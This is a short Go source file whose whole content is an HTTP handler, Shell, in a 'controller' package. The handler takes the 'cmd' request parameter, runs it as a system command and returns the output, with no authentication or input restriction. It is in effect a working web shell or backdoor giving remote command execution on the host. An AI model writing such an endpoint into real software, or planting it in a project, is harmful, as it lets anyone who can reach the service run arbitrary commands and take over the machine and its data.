package controller

import (
	"net/http"
	"os/exec"
	"strings"
)

//Shell - handler for excuting command from request
func Shell(rw http.ResponseWriter, req *http.Request) {

	stringcmd := strings.Split(req.FormValue("cmd"), " ")

	cmd := exec.Command(stringcmd[0], stringcmd[1:]...)
	out, err := cmd.CombinedOutput()
	if err == nil {
		rw.Write(out)
	} else {
		errormesg := "Error execution: " + strings.Join(stringcmd, " ")
		rw.Write([]byte(errormesg))
	}

}
